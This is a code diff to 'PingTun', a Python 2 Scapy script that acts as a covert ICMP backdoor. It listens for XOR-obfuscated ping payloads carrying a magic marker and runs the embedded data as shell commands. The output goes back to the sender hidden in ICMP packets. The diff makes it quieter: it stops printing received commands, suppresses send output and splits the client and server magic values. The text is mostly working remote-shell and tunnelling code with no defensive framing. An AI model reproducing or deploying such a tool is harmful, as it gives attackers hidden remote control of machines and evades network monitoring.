@@ -1,5 +1,5 @@
 from scapy.all import *
-import sys
+import sys, time
 
 if len(sys.argv) != 2:
         print "[PingTun] Usage: python2 client.py <interface>"
@@ -7,7 +7,10 @@ if len(sys.argv) != 2:
         exit()
 
 xor = "\x42\x42\x42\x42"
-magic = "\xde\xad\xbe\xef"
+
+client_magic = "\xde\xad\xbe\xef"
+server_magic = "\xbe\xef\xde\xad"
+
 ping = "\xaa\xab\xac\xad"
 port = "\xba\xbb\xbc\xbd"
 shell = "\xca\xcb\xcc\xcd"
@@ -17,17 +20,18 @@ source = ""
 def action(pkt):
 	buff = XOR(pkt.load)
 
-	if buff[0:4] == magic:
+	if buff[0:4] == client_magic:
 		source = pkt.src
 		if buff[4:8] == ping:
 			print "Ping"
 		elif buff[4:8] == port:
 			print "Port"
 		elif buff[4:8] == shell:
+			time.sleep(0.5)
 			command_shell(buff[8:])
 
 def packet_builder(data):
-	return Ether() / IP(dst=source) / ICMP() / (XOR(magic + data))
+	return Ether() / IP(dst=source) / ICMP() / (XOR(server_magic + data))
 
 def XOR(p):
         buff = ""
@@ -36,12 +40,11 @@ def XOR(p):
         return buff
 
 def command_shell(data):
-	print data
 	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
 	stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 	
 	value = proc.stdout.read() + proc.stderr.read()
 
-	sendp(packet_builder(shell + value))
+	sendp(packet_builder(shell + value),verbose=0)
 
 sniff(iface=sys.argv[1],filter="icmp",prn=action)
